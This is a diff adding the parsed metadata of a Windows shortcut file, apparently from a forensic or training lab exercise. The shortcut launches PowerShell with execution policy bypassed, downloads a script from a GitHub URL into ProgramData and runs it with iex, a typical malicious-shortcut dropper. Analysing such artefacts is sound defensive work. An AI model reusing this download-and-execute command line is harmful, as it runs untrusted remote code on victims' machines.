@@ -1,0 +1,134 @@
+Windows Shortcut Information:
+   Link CLSID: 00021401-0000-0000-C000-000000000046
+   Link Flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | HasArguments | IsUnicode | EnableTargetMetadata - (524475)
+   File Flags: FILE_ATTRIBUTE_ARCHIVE - (32)
+
+   Creation Timestamp: 2018-09-15 07:14:14.454767+00:00
+   Modified Timestamp: 2018-09-15 07:14:14.454767+00:00
+   Accessed Timestamp: 2018-09-15 07:14:14.454767+00:00
+
+   Icon Index: 0 
+   Window Style: SW_SHOWNORMAL 
+   HotKey: UNSET - UNSET {0x0000} 
+
+   TARGETS:
+      Index: 78
+      ITEMS:
+         Root Folder
+            Sort index: My Computer
+            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
+         Volume Item
+            Flags: 0xf
+            Data: None
+         File entry
+            Flags: Is directory
+            Modification time: 2023-05-17 19:45:40+00:00
+            File attribute flags: 16
+            Primary name: Windows
+         File entry
+            Flags: Is directory
+            Modification time: 2024-10-30 14:10:32+00:00
+            File attribute flags: 16
+            Primary name: System32
+         File entry
+            Flags: Is directory
+            Modification time: 2018-09-15 07:19:02+00:00
+            File attribute flags: 16
+            Primary name: WindowsPowerShell
+         File entry
+            Flags: Is directory
+            Modification time: 2018-09-15 09:07:34+00:00
+            File attribute flags: 16
+            Primary name: v1.0
+         File entry
+            Flags: Is file
+            Modification time: 2018-09-15 07:14:16+00:00
+            File attribute flags: 32
+            Primary name: powershell.exe
+
+   LINK INFO:
+      Link info flags: 1
+      Local base path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Common path suffix: 
+      LOCAL:
+         Drive type: 3
+         Drive serial number: 0xa8a4c362
+         Drive type: DRIVE_FIXED
+         Volume label: 
+
+   DATA
+      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      Working directory: C:\Windows\System32\WindowsPowerShell\v1.0
+      Command line arguments: -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
+
+   EXTRA BLOCKS:
+      SPECIAL_FOLDER_LOCATION_BLOCK
+         Special folder id: 37
+      KNOWN_FOLDER_LOCATION_BLOCK
+         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
+      DISTRIBUTED_LINK_TRACKER_BLOCK
+         Length: 88
+         Version: 0
+         Machine identifier: win-base-2019
+         Droid volume identifier: F6953DA0-D6BB-4C14-8DD4-1D39A7683054
+         Droid file identifier: 1BE092CD-96C8-11EF-82DA-02A0A1A4ABE5
+         Birth droid volume identifier: F6953DA0-D6BB-4C14-8DD4-1D39A7683054
+         Birth droid file identifier: 1BE092CD-96C8-11EF-82DA-02A0A1A4ABE5
+      METADATA_PROPERTIES_BLOCK
+         Property store:
+            Storage:
+               Version: 0x53505331
+               Format id: DABD30ED-0043-4789-A7F8-D013A4736622
+               Serialized property values:
+                  Property:
+                     Id: 100
+                     Value: v1.0 (C:\Windows\System32\WindowsPowerShell)
+                     Value type: VT_LPWSTR
+            Storage:
+               Version: 0x53505331
+               Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
+               Serialized property values:
+                  Property:
+                     Id: 4
+                     Value: S-1-5-21-1966530601-3185510712-10604624-500
+                     Value type: VT_LPWSTR
+            Storage:
+               Version: 0x53505331
+               Format id: B725F130-47EF-101A-A5F1-02608C9EEBAC
+               Serialized property values:
+                  Property:
+                     Id: 10
+                     Value: powershell.exe
+                     Value type: VT_LPWSTR
+                  Property:
+                     Id: 15
+                     Value: None
+                     Value type: VT_FILETIME
+                  Property:
+                     Id: 12
+                     Value: None
+                     Value type: VT_UI8
+                  Property:
+                     Id: 4
+                     Value: Application
+                     Value type: VT_LPWSTR
+                  Property:
+                     Id: 14
+                     Value: None
+                     Value type: VT_FILETIME
+            Storage:
+               Version: 0x53505331
+               Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0
+               Serialized property values:
+                  Property:
+                     Id: 30
+                     Value: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                     Value type: VT_LPWSTR
+            Storage:
+               Version: 0x53505331
+               Format id: 446D16B1-8DAD-4870-A748-402EA43D788C
+               Serialized property values:
+                  Property:
+                     Id: 104
+                     Value: None
+                     Value type: VT_CLSID
